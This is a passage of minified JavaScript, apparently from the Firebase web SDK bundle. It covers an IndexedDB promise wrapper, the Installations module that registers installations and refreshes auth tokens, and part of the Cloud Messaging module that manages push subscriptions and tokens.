                if (e) return new C(e, r.request);
              });
            }(this[n], e, arguments);
          });
        });
      }
      function T(e) {
        this._index = e;
      }
      function C(e, t) {
        this._cursor = e, this._request = t;
      }
      function _(e) {
        this._store = e;
      }
      function P(n) {
        this._tx = n, this.complete = new Promise(function (e, t) {
          n.oncomplete = function () {
            e();
          }, n.onerror = function () {
            t(n.error);
          }, n.onabort = function () {
            t(n.error);
          };
        });
      }
      function j(e, t, n) {
        this._db = e, this.oldVersion = t, this.transaction = new P(n);
      }
      function E(e) {
        this._db = e;
      }
      function D(e, t, n) {
        var r = w(indexedDB, "open", [e, t]),
          i = r.request;
        return i && (i.onupgradeneeded = function (e) {
          n && n(new j(i.result, e.oldVersion, i.transaction));
        }), r.then(function (e) {
          return new E(e);
        });
      }
      function x(e) {
        return w(indexedDB, "deleteDatabase", [e]);
      }
      m(T, "_index", ["name", "keyPath", "multiEntry", "unique"]), k(T, "_index", IDBIndex, ["get", "getKey", "getAll", "getAllKeys", "count"]), I(T, "_index", IDBIndex, ["openCursor", "openKeyCursor"]), m(C, "_cursor", ["direction", "key", "primaryKey", "value"]), k(C, "_cursor", IDBCursor, ["update", "delete"]), ["advance", "continue", "continuePrimaryKey"].forEach(function (n) {
        n in IDBCursor.prototype && (C.prototype[n] = function () {
          var t = this,
            e = arguments;
          return Promise.resolve().then(function () {
            return t._cursor[n].apply(t._cursor, e), y(t._request).then(function (e) {
              if (e) return new C(e, t._request);
            });
          });
        });
      }), _.prototype.createIndex = function () {
        return new T(this._store.createIndex.apply(this._store, arguments));
      }, _.prototype.index = function () {
        return new T(this._store.index.apply(this._store, arguments));
      }, m(_, "_store", ["name", "keyPath", "indexNames", "autoIncrement"]), k(_, "_store", IDBObjectStore, ["put", "add", "delete", "clear", "get", "getAll", "getKey", "getAllKeys", "count"]), I(_, "_store", IDBObjectStore, ["openCursor", "openKeyCursor"]), S(_, "_store", IDBObjectStore, ["deleteIndex"]), P.prototype.objectStore = function () {
        return new _(this._tx.objectStore.apply(this._tx, arguments));
      }, m(P, "_tx", ["objectStoreNames", "mode"]), S(P, "_tx", IDBTransaction, ["abort"]), j.prototype.createObjectStore = function () {
        return new _(this._db.createObjectStore.apply(this._db, arguments));
      }, m(j, "_db", ["name", "version", "objectStoreNames"]), S(j, "_db", IDBDatabase, ["deleteObjectStore", "close"]), E.prototype.transaction = function () {
        return new P(this._db.transaction.apply(this._db, arguments));
      }, m(E, "_db", ["name", "version", "objectStoreNames"]), S(E, "_db", IDBDatabase, ["close"]), ["openCursor", "openKeyCursor"].forEach(function (i) {
        [_, T].forEach(function (e) {
          i in e.prototype && (e.prototype[i.replace("open", "iterate")] = function () {
            var e = function (e) {
                return Array.prototype.slice.call(e);
              }(arguments),
              t = e[e.length - 1],
              n = this._store || this._index,
              r = n[i].apply(n, e.slice(0, -1));
            r.onsuccess = function () {
              t(r.result);
            };
          });
        });
      }), [T, _].forEach(function (e) {
        e.prototype.getAll || (e.prototype.getAll = function (e, n) {
          var r = this,
            i = [];
          return new Promise(function (t) {
            r.iterateCursor(e, function (e) {
              e ? (i.push(e.value), void 0 === n || i.length != n ? e.continue() : t(i)) : t(i);
            });
          });
        });
      });
      var K,
        O = "0.4.6",
        N = 1e4,
        M = "w:" + O,
        A = "FIS_v2",
        q = "https://firebaseinstallations.googleapis.com/v1",
        B = 36e5,
        R = ((K = {})["missing-app-config-values"] = 'Missing App configuration value: "{$valueName}"', K["not-registered"] = "Firebase Installation is not registered.", K["installation-not-found"] = "Firebase Installation not found.", K["request-failed"] = '{$requestName} request failed with error "{$serverCode} {$serverStatus}: {$serverMessage}"', K["app-offline"] = "Could not process request. Application offline.", K["delete-pending-registration"] = "Can't delete installation while there is a pending registration request.", K),
        L = new f("installations", "Installations", R);
      function V(e) {
        return e instanceof d && e.code.includes("request-failed");
      }
      function W(e) {
        var t = e.projectId;
        return q + "/projects/" + t + "/installations";
      }
      function F(e) {
        return {
          token: e.token,
          requestStatus: 2,
          expiresIn: function (e) {
            return Number(e.replace("s", "000"));
          }(e.expiresIn),
          creationTime: Date.now()
        };
      }
      function H(r, i) {
        return l(this, void 0, void 0, function () {
          var t, n;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, i.json()];
              case 1:
                return t = e.sent(), n = t.error, [2, L.create("request-failed", {
                  requestName: r,
                  serverCode: n.code,
                  serverMessage: n.message,
                  serverStatus: n.status
                })];
            }
          });
        });
      }
      function U(e) {
        var t = e.apiKey;
        return new Headers({
          "Content-Type": "application/json",
          Accept: "application/json",
          "x-goog-api-key": t
        });
      }
      function $(e, t) {
        var n = t.refreshToken,
          r = U(e);
        return r.append("Authorization", function (e) {
          return A + " " + e;
        }(n)), r;
      }
      function G(n) {
        return l(this, void 0, void 0, function () {
          var t;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, n()];
              case 1:
                return 500 <= (t = e.sent()).status && t.status < 600 ? [2, n()] : [2, t];
            }
          });
        });
      }
      function z(t) {
        return new Promise(function (e) {
          setTimeout(e, t);
        });
      }
      var J = /^[cdef][\w-]{21}$/,
        Y = "";
      function Z() {
        try {
          var e = new Uint8Array(17);
          (self.crypto || self.msCrypto).getRandomValues(e), e[0] = 112 + e[0] % 16;
          var t = function (e) {
            return function (e) {
              return btoa(String.fromCharCode.apply(String, i(e))).replace(/\+/g, "-").replace(/\//g, "_");
            }(e).substr(0, 22);
          }(e);
          return J.test(t) ? t : Y;
        } catch (e) {
          return Y;
        }
      }
      function Q(e) {
        return e.appName + "!" + e.appId;
      }
      var X = new Map();
      function ee(e, t) {
        var n = Q(e);
        te(n, t), function (e, t) {
          var n = re();
          n && n.postMessage({
            key: e,
            fid: t
          });
          ie();
        }(n, t);
      }
      function te(e, t) {
        var n,
          r,
          i = X.get(e);
        if (i) try {
          for (var o = c(i), s = o.next(); !s.done; s = o.next()) {
            (0, s.value)(t);
          }
        } catch (e) {
          n = {
            error: e
          };
        } finally {
          try {
            s && !s.done && (r = o.return) && r.call(o);
          } finally {
            if (n) throw n.error;
          }
        }
      }
      var ne = null;
      function re() {
        return !ne && "BroadcastChannel" in self && ((ne = new BroadcastChannel("[Firebase] FID Change")).onmessage = function (e) {
          te(e.data.key, e.data.fid);
        }), ne;
      }
      function ie() {
        0 === X.size && ne && (ne.close(), ne = null);
      }
      var oe,
        se,
        ae = "firebase-installations-database",
        ue = 1,
        ce = "firebase-installations-store",
        fe = null;
      function le() {
        return fe = fe || D(ae, ue, function (e) {
          switch (e.oldVersion) {
            case 0:
              e.createObjectStore(ce);
          }
        });
      }
      function pe(s, a) {
        return l(this, void 0, void 0, function () {
          var t, n, r, i, o;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = Q(s), [4, le()];
              case 1:
                return n = e.sent(), r = n.transaction(ce, "readwrite"), [4, (i = r.objectStore(ce)).get(t)];
              case 2:
                return o = e.sent(), [4, i.put(a, t)];
              case 3:
                return e.sent(), [4, r.complete];
              case 4:
                return e.sent(), o && o.fid === a.fid || ee(s, a.fid), [2, a];
            }
          });
        });
      }
      function de(i) {
        return l(this, void 0, void 0, function () {
          var t, n, r;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = Q(i), [4, le()];
              case 1:
                return n = e.sent(), [4, (r = n.transaction(ce, "readwrite")).objectStore(ce).delete(t)];
              case 2:
                return e.sent(), [4, r.complete];
              case 3:
                return e.sent(), [2];
            }
          });
        });
      }
      function he(a, u) {
        return l(this, void 0, void 0, function () {
          var t, n, r, i, o, s;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = Q(a), [4, le()];
              case 1:
                return n = e.sent(), r = n.transaction(ce, "readwrite"), [4, (i = r.objectStore(ce)).get(t)];
              case 2:
                return o = e.sent(), void 0 !== (s = u(o)) ? [3, 4] : [4, i.delete(t)];
              case 3:
                return e.sent(), [3, 6];
              case 4:
                return [4, i.put(s, t)];
              case 5:
                e.sent(), e.label = 6;
              case 6:
                return [4, r.complete];
              case 7:
                return e.sent(), !s || o && o.fid === s.fid || ee(a, s.fid), [2, s];
            }
          });
        });
      }
      function ve(i) {
        return l(this, void 0, void 0, function () {
          var r, t, n;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, he(i, function (e) {
                  var t = function (e) {
                      return be(e || {
                        fid: Z(),
                        registrationStatus: 0
                      });
                    }(e),
                    n = function (e, t) {
                      {
                        if (0 !== t.registrationStatus) return 1 === t.registrationStatus ? {
                          installationEntry: t,
                          registrationPromise: function (o) {
                            return l(this, void 0, void 0, function () {
                              var t, n, r, i;
                              return p(this, function (e) {
                                switch (e.label) {
                                  case 0:
                                    return [4, ge(o)];
                                  case 1:
                                    t = e.sent(), e.label = 2;
                                  case 2:
                                    return 1 !== t.registrationStatus ? [3, 5] : [4, z(100)];
                                  case 3:
                                    return e.sent(), [4, ge(o)];
                                  case 4:
                                    return t = e.sent(), [3, 2];
                                  case 5:
                                    return 0 !== t.registrationStatus ? [3, 7] : [4, ve(o)];
                                  case 6:
                                    return n = e.sent(), r = n.installationEntry, (i = n.registrationPromise) ? [2, i] : [2, r];
                                  case 7:
                                    return [2, t];
                                }
                              });
                            });
                          }(e)
                        } : {
                          installationEntry: t
                        };
                        if (!navigator.onLine) {
                          var n = Promise.reject(L.create("app-offline"));
                          return {
                            installationEntry: t,
                            registrationPromise: n
                          };
                        }
                        var r = {
                            fid: t.fid,
                            registrationStatus: 1,
                            registrationTime: Date.now()
                          },
                          i = function (r, i) {
                            return l(this, void 0, void 0, function () {
                              var t, n;
                              return p(this, function (e) {
                                switch (e.label) {
                                  case 0:
                                    return e.trys.push([0, 2,, 7]), [4, function (a, e) {
                                      var u = e.fid;
                                      return l(this, void 0, void 0, function () {
                                        var t, n, r, i, o, s;
                                        return p(this, function (e) {
                                          switch (e.label) {
                                            case 0:
                                              return t = W(a), n = U(a), r = {
                                                fid: u,
                                                authVersion: A,
                                                appId: a.appId,
                                                sdkVersion: M
                                              }, i = {
                                                method: "POST",
                                                headers: n,
                                                body: JSON.stringify(r)
                                              }, [4, G(function () {
                                                return fetch(t, i);
                                              })];
                                            case 1:
                                              return (o = e.sent()).ok ? [4, o.json()] : [3, 3];
                                            case 2:
                                              return s = e.sent(), [2, {
                                                fid: s.fid || u,
                                                registrationStatus: 2,
                                                refreshToken: s.refreshToken,
                                                authToken: F(s.authToken)
                                              }];
                                            case 3:
                                              return [4, H("Create Installation", o)];
                                            case 4:
                                              throw e.sent();
                                          }
                                        });
                                      });
                                    }(r, i)];
                                  case 1:
                                    return t = e.sent(), [2, pe(r, t)];
                                  case 2:
                                    return V(n = e.sent()) && 409 === n.serverCode ? [4, de(r)] : [3, 4];
                                  case 3:
                                    return e.sent(), [3, 6];
                                  case 4:
                                    return [4, pe(r, {
                                      fid: i.fid,
                                      registrationStatus: 0
                                    })];
                                  case 5:
                                    e.sent(), e.label = 6;
                                  case 6:
                                    throw n;
                                  case 7:
                                    return [2];
                                }
                              });
                            });
                          }(e, r);
                        return {
                          installationEntry: r,
                          registrationPromise: i
                        };
                      }
                    }(i, t);
                  return r = n.registrationPromise, n.installationEntry;
                })];
              case 1:
                return (t = e.sent()).fid !== Y ? [3, 3] : (n = {}, [4, r]);
              case 2:
                return [2, (n.installationEntry = e.sent(), n)];
              case 3:
                return [2, {
                  installationEntry: t,
                  registrationPromise: r
                }];
            }
          });
        });
      }
      function ge(e) {
        return he(e, function (e) {
          if (!e) throw L.create("installation-not-found");
          return be(e);
        });
      }
      function be(e) {
        return function (e) {
          return 1 === e.registrationStatus && e.registrationTime + N < Date.now();
        }(e) ? {
          fid: e.fid,
          registrationStatus: 0
        } : e;
      }
      function ye(e, u) {
        var c = e.appConfig,
          f = e.platformLoggerProvider;
        return l(this, void 0, void 0, function () {
          var t, n, r, i, o, s, a;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = function (e, t) {
                  var n = t.fid;
                  return W(e) + "/" + n + "/authTokens:generate";
                }(c, u), n = $(c, u), (r = f.getImmediate({
                  optional: !0
                })) && n.append("x-firebase-client", r.getPlatformInfoString()), i = {
                  installation: {
                    sdkVersion: M
                  }
                }, o = {
                  method: "POST",
                  headers: n,
                  body: JSON.stringify(i)
                }, [4, G(function () {
                  return fetch(t, o);
                })];
              case 1:
                return (s = e.sent()).ok ? [4, s.json()] : [3, 3];
              case 2:
                return a = e.sent(), [2, F(a)];
              case 3:
                return [4, H("Generate Auth Token", s)];
              case 4:
                throw e.sent();
            }
          });
        });
      }
      function we(i, o) {
        return void 0 === o && (o = !1), l(this, void 0, void 0, function () {
          var r, t, n;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, he(i.appConfig, function (e) {
                  if (!ke(e)) throw L.create("not-registered");
                  var t = e.authToken;
                  if (!o && function (e) {
                    return 2 === e.requestStatus && !function (e) {
                      var t = Date.now();
                      return t < e.creationTime || e.creationTime + e.expiresIn < t + B;
                    }(e);
                  }(t)) return e;
                  if (1 === t.requestStatus) return r = function (r, i) {
                    return l(this, void 0, void 0, function () {
                      var t, n;
                      return p(this, function (e) {
                        switch (e.label) {
                          case 0:
                            return [4, me(r.appConfig)];
                          case 1:
                            t = e.sent(), e.label = 2;
                          case 2:
                            return 1 !== t.authToken.requestStatus ? [3, 5] : [4, z(100)];
                          case 3:
                            return e.sent(), [4, me(r.appConfig)];
                          case 4:
                            return t = e.sent(), [3, 2];
                          case 5:
                            return 0 === (n = t.authToken).requestStatus ? [2, we(r, i)] : [2, n];
                        }
                      });
                    });
                  }(i, o), e;
                  if (!navigator.onLine) throw L.create("app-offline");
                  var n = function (e) {
                    var t = {
                      requestStatus: 1,
                      requestTime: Date.now()
                    };
                    return u(u({}, e), {
                      authToken: t
                    });
                  }(e);
                  return r = function (i, o) {
                    return l(this, void 0, void 0, function () {
                      var t, n, r;
                      return p(this, function (e) {
                        switch (e.label) {
                          case 0:
                            return e.trys.push([0, 3,, 8]), [4, ye(i, o)];
                          case 1:
                            return t = e.sent(), r = u(u({}, o), {
                              authToken: t
                            }), [4, pe(i.appConfig, r)];
                          case 2:
                            return e.sent(), [2, t];
                          case 3:
                            return !V(n = e.sent()) || 401 !== n.serverCode && 404 !== n.serverCode ? [3, 5] : [4, de(i.appConfig)];
                          case 4:
                            return e.sent(), [3, 7];
                          case 5:
                            return r = u(u({}, o), {
                              authToken: {
                                requestStatus: 0
                              }
                            }), [4, pe(i.appConfig, r)];
                          case 6:
                            e.sent(), e.label = 7;
                          case 7:
                            throw n;
                          case 8:
                            return [2];
                        }
                      });
                    });
                  }(i, n), n;
                })];
              case 1:
                return t = e.sent(), r ? [4, r] : [3, 3];
              case 2:
                return n = e.sent(), [3, 4];
              case 3:
                n = t.authToken, e.label = 4;
              case 4:
                return [2, n];
            }
          });
        });
      }
      function me(e) {
        return he(e, function (e) {
          if (!ke(e)) throw L.create("not-registered");
          return function (e) {
            return 1 === e.requestStatus && e.requestTime + N < Date.now();
          }(e.authToken) ? u(u({}, e), {
            authToken: {
              requestStatus: 0
            }
          }) : e;
        });
      }
      function ke(e) {
        return void 0 !== e && 2 === e.registrationStatus;
      }
      function Se(t, n) {
        return void 0 === n && (n = !1), l(this, void 0, void 0, function () {
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, function (n) {
                  return l(this, void 0, void 0, function () {
                    var t;
                    return p(this, function (e) {
                      switch (e.label) {
                        case 0:
                          return [4, ve(n)];
                        case 1:
                          return (t = e.sent().registrationPromise) ? [4, t] : [3, 3];
                        case 2:
                          e.sent(), e.label = 3;
                        case 3:
                          return [2];
                      }
                    });
                  });
                }(t.appConfig)];
              case 1:
                return e.sent(), [4, we(t, n)];
              case 2:
                return [2, e.sent().token];
            }
          });
        });
      }
      function Ie(o, s) {
        return l(this, void 0, void 0, function () {
          var t, n, r, i;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = function (e, t) {
                  var n = t.fid;
                  return W(e) + "/" + n;
                }(o, s), n = $(o, s), r = {
                  method: "DELETE",
                  headers: n
                }, [4, G(function () {
                  return fetch(t, r);
                })];
              case 1:
                return (i = e.sent()).ok ? [3, 3] : [4, H("Delete Installation", i)];
              case 2:
                throw e.sent();
              case 3:
                return [2];
            }
          });
        });
      }
      function Te(e, t) {
        var n = e.appConfig;
        return function (e, t) {
          re();
          var n = Q(e),
            r = X.get(n);
          r || (r = new Set(), X.set(n, r)), r.add(t);
        }(n, t), function () {
          !function (e, t) {
            var n = Q(e),
              r = X.get(n);
            r && (r.delete(t), 0 === r.size && X.delete(n), ie());
          }(n, t);
        };
      }
      function Ce(e) {
        return L.create("missing-app-config-values", {
          valueName: e
        });
      }
      (oe = ft).INTERNAL.registerComponent(new g("installations", function (e) {
        var t = e.getProvider("app").getImmediate(),
          n = {
            appConfig: function (e) {
              var t, n;
              if (!e || !e.options) throw Ce("App Configuration");
              if (!e.name) throw Ce("App Name");
              try {
                for (var r = c(["projectId", "apiKey", "appId"]), i = r.next(); !i.done; i = r.next()) {
                  var o = i.value;
                  if (!e.options[o]) throw Ce(o);
                }
              } catch (e) {
                t = {
                  error: e
                };
              } finally {
                try {
                  i && !i.done && (n = r.return) && n.call(r);
                } finally {
                  if (t) throw t.error;
                }
              }
              return {
                appName: e.name,
                projectId: e.options.projectId,
                apiKey: e.options.apiKey,
                appId: e.options.appId
              };
            }(t),
            platformLoggerProvider: e.getProvider("platform-logger")
          };
        return {
          app: t,
          getId: function () {
            return function (i) {
              return l(this, void 0, void 0, function () {
                var t, n, r;
                return p(this, function (e) {
                  switch (e.label) {
                    case 0:
                      return [4, ve(i.appConfig)];
                    case 1:
                      return t = e.sent(), n = t.installationEntry, (r = t.registrationPromise) ? r.catch(console.error) : we(i).catch(console.error), [2, n.fid];
                  }
                });
              });
            }(n);
          },
          getToken: function (e) {
            return Se(n, e);
          },
          delete: function () {
            return function (r) {
              return l(this, void 0, void 0, function () {
                var t, n;
                return p(this, function (e) {
                  switch (e.label) {
                    case 0:
                      return [4, he(t = r.appConfig, function (e) {
                        if (!e || 0 !== e.registrationStatus) return e;
                      })];
                    case 1:
                      if (!(n = e.sent())) return [3, 6];
                      if (1 !== n.registrationStatus) return [3, 2];
                      throw L.create("delete-pending-registration");
                    case 2:
                      if (2 !== n.registrationStatus) return [3, 6];
                      if (navigator.onLine) return [3, 3];
                      throw L.create("app-offline");
                    case 3:
                      return [4, Ie(t, n)];
                    case 4:
                      return e.sent(), [4, de(t)];
                    case 5:
                      e.sent(), e.label = 6;
                    case 6:
                      return [2];
                  }
                });
              });
            }(n);
          },
          onIdChange: function (e) {
            return Te(n, e);
          }
        };
      }, "PUBLIC")), oe.registerVersion("@firebase/installations", O);
      var _e = ((se = {})["missing-app-config-values"] = 'Missing App configuration value: "{$valueName}"', se["only-available-in-window"] = "This method is available in a Window context.", se["only-available-in-sw"] = "This method is available in a service worker context.", se["permission-default"] = "The notification permission was not granted and dismissed instead.", se["permission-blocked"] = "The notification permission was not granted and blocked instead.", se["unsupported-browser"] = "This browser doesn't support the API's required to use the firebase SDK.", se["failed-service-worker-registration"] = "We are unable to register the default service worker. {$browserErrorMessage}", se["token-subscribe-failed"] = "A problem occured while subscribing the user to FCM: {$errorInfo}", se["token-subscribe-no-token"] = "FCM returned no token when subscribing the user to push.", se["token-unsubscribe-failed"] = "A problem occured while unsubscribing the user from FCM: {$errorInfo}", se["token-update-failed"] = "A problem occured while updating the user from FCM: {$errorInfo}", se["token-update-no-token"] = "FCM returned no token when updating the user to push.", se["use-sw-after-get-token"] = "The useServiceWorker() method may only be called once and must be called before calling getToken() to ensure your service worker is used.", se["invalid-sw-registration"] = "The input to useServiceWorker() must be a ServiceWorkerRegistration.", se["invalid-bg-handler"] = "The input to setBackgroundMessageHandler() must be a function.", se["invalid-vapid-key"] = "The public VAPID key must be a string.", se["use-vapid-key-after-get-token"] = "The usePublicVapidKey() method may only be called once and must be called before calling getToken() to ensure your VAPID key is used.", se),
        Pe = new f("messaging", "Messaging", _e);
      function je(e) {
        return Pe.create("missing-app-config-values", {
          valueName: e
        });
      }
      function Ee(e) {
        var t = new Uint8Array(e);
        return btoa(String.fromCharCode.apply(String, i(t))).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
      }
      var De = "fcm_token_details_db",
        xe = 5,
        Ke = "fcm_token_object_Store";
      function Oe(a) {
        return l(this, void 0, void 0, function () {
          var t,
            s,
            n = this;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return "databases" in indexedDB ? [4, indexedDB.databases()] : [3, 2];
              case 1:
                if (t = e.sent(), !t.map(function (e) {
                  return e.name;
                }).includes(De)) return [2, null];
                e.label = 2;
              case 2:
                return s = null, [4, D(De, xe, function (o) {
                  return l(n, void 0, void 0, function () {
                    var t, n, r, i;
                    return p(this, function (e) {
                      switch (e.label) {
                        case 0:
                          return o.oldVersion < 2 ? [2] : o.objectStoreNames.contains(Ke) ? [4, (t = o.transaction.objectStore(Ke)).index("fcmSenderId").get(a)] : [2];
                        case 1:
                          return n = e.sent(), [4, t.clear()];
                        case 2:
                          if (e.sent(), !n) return [2];
                          if (2 === o.oldVersion) {
                            if (!(r = n).auth || !r.p256dh || !r.endpoint) return [2];
                            s = {
                              token: r.fcmToken,
                              createTime: null !== (i = r.createTime) && void 0 !== i ? i : Date.now(),
                              subscriptionOptions: {
                                auth: r.auth,
                                p256dh: r.p256dh,
                                endpoint: r.endpoint,
                                swScope: r.swScope,
                                vapidKey: "string" == typeof r.vapidKey ? r.vapidKey : Ee(r.vapidKey)
                              }
                            };
                          } else 3 === o.oldVersion ? s = {
                            token: (r = n).fcmToken,
                            createTime: r.createTime,
                            subscriptionOptions: {
                              auth: Ee(r.auth),
                              p256dh: Ee(r.p256dh),
                              endpoint: r.endpoint,
                              swScope: r.swScope,
                              vapidKey: Ee(r.vapidKey)
                            }
                          } : 4 === o.oldVersion && (s = {
                            token: (r = n).fcmToken,
                            createTime: r.createTime,
                            subscriptionOptions: {
                              auth: Ee(r.auth),
                              p256dh: Ee(r.p256dh),
                              endpoint: r.endpoint,
                              swScope: r.swScope,
                              vapidKey: Ee(r.vapidKey)
                            }
                          });
                          return [2];
                      }
                    });
                  });
                })];
              case 3:
                return e.sent().close(), [4, x(De)];
              case 4:
                return e.sent(), [4, x("fcm_vapid_details_db")];
              case 5:
                return e.sent(), [4, x("undefined")];
              case 6:
                return e.sent(), [2, function (e) {
                  if (!e || !e.subscriptionOptions) return !1;
                  var t = e.subscriptionOptions;
                  return "number" == typeof e.createTime && 0 < e.createTime && "string" == typeof e.token && 0 < e.token.length && "string" == typeof t.auth && 0 < t.auth.length && "string" == typeof t.p256dh && 0 < t.p256dh.length && "string" == typeof t.endpoint && 0 < t.endpoint.length && "string" == typeof t.swScope && 0 < t.swScope.length && "string" == typeof t.vapidKey && 0 < t.vapidKey.length;
                }(s) ? s : null];
            }
          });
        });
      }
      var Ne = "firebase-messaging-database",
        Me = 1,
        Ae = "firebase-messaging-store",
        qe = null;
      function Be() {
        return qe = qe || D(Ne, Me, function (e) {
          switch (e.oldVersion) {
            case 0:
              e.createObjectStore(Ae);
          }
        });
      }
      function Re(i) {
        return l(this, void 0, void 0, function () {
          var t, n, r;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = Ve(i), [4, Be()];
              case 1:
                return [4, e.sent().transaction(Ae).objectStore(Ae).get(t)];
              case 2:
                return (n = e.sent()) ? [2, n] : [3, 3];
              case 3:
                return [4, Oe(i.appConfig.senderId)];
              case 4:
                return (r = e.sent()) ? [4, Le(i, r)] : [3, 6];
              case 5:
                return e.sent(), [2, r];
              case 6:
                return [2];
            }
          });
        });
      }
      function Le(i, o) {
        return l(this, void 0, void 0, function () {
          var t, n, r;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = Ve(i), [4, Be()];
              case 1:
                return n = e.sent(), [4, (r = n.transaction(Ae, "readwrite")).objectStore(Ae).put(o, t)];
              case 2:
                return e.sent(), [4, r.complete];
              case 3:
                return e.sent(), [2, o];
            }
          });
        });
      }
      function Ve(e) {
        return e.appConfig.appId;
      }
      var We = "BDOU99-h67HcA6JeFXHbSNMu7e2yNNu3RzoMj8TM4W88jITfq7ZmPvIM1Iv-4_l2LxQcYwhqby2xGpWwzjfAnG4",
        Fe = "https://fcmregistrations.googleapis.com/v1",
        He = "FCM_MSG",
        Ue = "google.c.a.c_id";
      function $e(s, a) {
        return l(this, void 0, void 0, function () {
          var t, n, r, i, o;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, ze(s)];
              case 1:
                t = e.sent(), n = {
                  method: "DELETE",
                  headers: t
                }, e.label = 2;
              case 2:
                return e.trys.push([2, 5,, 6]), [4, fetch(Ge(s.appConfig) + "/" + a, n)];
              case 3:
                return [4, e.sent().json()];
              case 4:
                if ((r = e.sent()).error) throw i = r.error.message, Pe.create("token-unsubscribe-failed", {
                  errorInfo: i
                });
                return [3, 6];
              case 5:
                throw o = e.sent(), Pe.create("token-unsubscribe-failed", {
                  errorInfo: o
                });
              case 6:
                return [2];
            }
          });
        });
      }
      function Ge(e) {
        var t = e.projectId;
        return Fe + "/projects/" + t + "/registrations";
      }
      function ze(e) {
        var n = e.appConfig,
          r = e.installations;
        return l(this, void 0, void 0, function () {
          var t;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, r.getToken()];
              case 1:
                return t = e.sent(), [2, new Headers({
                  "Content-Type": "application/json",
                  Accept: "application/json",
                  "x-goog-api-key": n.apiKey,
                  "x-goog-firebase-installations-auth": "FIS " + t
                })];
            }
          });
        });
      }
      function Je(e) {
        var t = e.p256dh,
          n = e.auth,
          r = e.endpoint,
          i = e.vapidKey,
          o = {
            web: {
              endpoint: r,
              auth: n,
              p256dh: t
            }
          };
        return i !== We && (o.web.applicationPubKey = i), o;
      }
      var Ye, Ze;
      function Qe(o, s, a) {
        return l(this, void 0, void 0, function () {
          var t, n, r, i;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                if ("granted" !== Notification.permission) throw Pe.create("permission-blocked");
                return [4, function (n, r) {
                  return l(this, void 0, void 0, function () {
                    var t;
                    return p(this, function (e) {
                      switch (e.label) {
                        case 0:
                          return [4, n.pushManager.getSubscription()];
                        case 1:
                          return (t = e.sent()) ? [2, t] : [2, n.pushManager.subscribe({
                            userVisibleOnly: !0,
                            applicationServerKey: r
                          })];
                      }
                    });
                  });
                }(s, a)];
              case 1:
                return t = e.sent(), [4, Re(o)];
              case 2:
                return n = e.sent(), r = {
                  vapidKey: a,
                  swScope: s.scope,
                  endpoint: t.endpoint,
                  auth: Ee(t.getKey("auth")),
                  p256dh: Ee(t.getKey("p256dh"))
                }, n ? [3, 3] : [2, et(o, r)];
              case 3:
                if (function (e, t) {
                  var n = t.vapidKey === e.vapidKey,
                    r = t.endpoint === e.endpoint,
                    i = t.auth === e.auth,
                    o = t.p256dh === e.p256dh;
                  return n && r && i && o;
                }(n.subscriptionOptions, r)) return [3, 8];
                e.label = 4;
              case 4:
                return e.trys.push([4, 6,, 7]), [4, $e(o, n.token)];
              case 5:
                return e.sent(), [3, 7];
              case 6:
                return i = e.sent(), console.warn(i), [3, 7];
              case 7:
                return [2, et(o, r)];
              case 8:
                return Date.now() >= n.createTime + 6048e5 ? [2, function (i, o, s) {
                  return l(this, void 0, void 0, function () {
                    var t, n, r;
                    return p(this, function (e) {
                      switch (e.label) {
                        case 0:
                          return e.trys.push([0, 3,, 5]), [4, function (a, u) {
                            return l(this, void 0, void 0, function () {
                              var t, n, r, i, o, s;
                              return p(this, function (e) {
                                switch (e.label) {
                                  case 0:
                                    return [4, ze(a)];
                                  case 1:
                                    t = e.sent(), n = Je(u.subscriptionOptions), r = {
                                      method: "PATCH",
                                      headers: t,
                                      body: JSON.stringify(n)
                                    }, e.label = 2;
                                  case 2:
                                    return e.trys.push([2, 5,, 6]), [4, fetch(Ge(a.appConfig) + "/" + u.token, r)];
                                  case 3:
                                    return [4, e.sent().json()];
                                  case 4:
                                    return i = e.sent(), [3, 6];
                                  case 5:
                                    throw o = e.sent(), Pe.create("token-update-failed", {
                                      errorInfo: o
                                    });
                                  case 6:
                                    if (i.error) throw s = i.error.message, Pe.create("token-update-failed", {
                                      errorInfo: s
                                    });
                                    if (!i.token) throw Pe.create("token-update-no-token");
                                    return [2, i.token];
                                }
                              });
                            });
                          }(o, i)];
                        case 1:
                          return t = e.sent(), n = u({
                            token: t,
                            createTime: Date.now()
                          }, i), [4, Le(o, n)];
                        case 2:
                          return e.sent(), [2, t];
                        case 3:
                          return r = e.sent(), [4, Xe(o, s)];
                        case 4:
                          throw e.sent(), r;
                        case 5:
                          return [2];
                      }
                    });
                  });
                }({
                  token: n.token,
                  createTime: Date.now(),
                  subscriptionOptions: r
                }, o, s)] : [2, n.token];
              case 9:
                return [2];
            }
          });
        });
      }
      function Xe(r, i) {
        return l(this, void 0, void 0, function () {
          var t, n;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, Re(r)];
              case 1:
                return (t = e.sent()) ? [4, $e(r, t.token)] : [3, 4];
              case 2:
                return e.sent(), [4, function (i) {
                  return l(this, void 0, void 0, function () {
                    var t, n, r;
                    return p(this, function (e) {
                      switch (e.label) {
                        case 0:
                          return t = Ve(i), [4, Be()];
                        case 1:
                          return n = e.sent(), [4, (r = n.transaction(Ae, "readwrite")).objectStore(Ae).delete(t)];
                        case 2:
                          return e.sent(), [4, r.complete];
                        case 3:
                          return e.sent(), [2];
                      }
                    });
                  });
                }(r)];
              case 3:
                e.sent(), e.label = 4;
              case 4:
                return [4, i.pushManager.getSubscription()];
              case 5:
                return (n = e.sent()) ? [2, n.unsubscribe()] : [2, !0];
            }
          });
        });
      }
      function et(r, i) {
